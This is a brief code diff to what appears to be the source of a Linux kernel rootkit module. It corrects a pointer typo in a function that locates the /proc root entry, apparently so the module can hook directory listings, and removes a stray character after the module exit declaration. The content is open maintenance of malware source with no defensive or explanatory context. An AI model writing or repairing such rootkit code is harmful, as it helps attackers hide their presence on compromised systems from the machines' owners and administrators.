@@ -147,7 +147,7 @@ static inline void change_proc_root_readdir(void) {
 
 static inline void proc_init(void) {
 	ptr = create_proc_entry("temporary", 0444, NULL);
-	prt = ptr->parent;								/* ptr->parent was pointer to /proc --
+	ptr = ptr->parent;								/* ptr->parent was pointer to /proc --
 													 * if it's not, we've got problems */
 	if (strcmp(ptr->name, "/proc") != 0) {
 		failed = 1;
@@ -254,4 +254,4 @@ static inline void proc_init(void) {
 
 
  module_init(rootkit_init);
- module_exit(rootkit_exit);d
+ module_exit(rootkit_exit);
